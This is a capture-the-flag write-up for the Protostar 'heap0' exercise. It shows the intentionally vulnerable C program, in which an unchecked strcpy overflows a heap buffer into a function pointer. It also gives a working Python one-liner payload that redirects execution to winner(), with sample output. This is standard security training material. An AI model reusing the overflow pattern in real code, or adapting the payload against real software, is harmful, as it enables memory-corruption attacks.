Source:
```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct data {
  char name[64];
};

struct fp {
  int (*fp)();
};

void winner()
{
  printf("level passed\n");
}

void nowinner()
{
  printf("level has not been passed\n");
}

int main(int argc, char **argv)
{
  struct data *d;
  struct fp *f;

  d = malloc(sizeof(struct data));
  f = malloc(sizeof(struct fp));
  f->fp = nowinner;

  printf("data is at %p, fp is at %p\n", d, f);

  strcpy(d->name, argv[1]);
  
  f->fp();

}
```

Upon running the code with random argument, we see that `d` (hence `d->name`) is at `0x804a008` and `fp` is at `0x804a050`.

From GDB, I knew that `winner` is at `0x8048464`.

Type the following: `python -c "print 'a'*72+'\x64\x84\x04\x08'" | xargs ./heap0`.

Sample output:
```bash
user@protostar:/opt/protostar/bin$ python -c "print 'a'*72+'\x64\x84\x04\x08'" | xargs ./heap0
data is at 0x804a008, fp is at 0x804a050
level passed
```
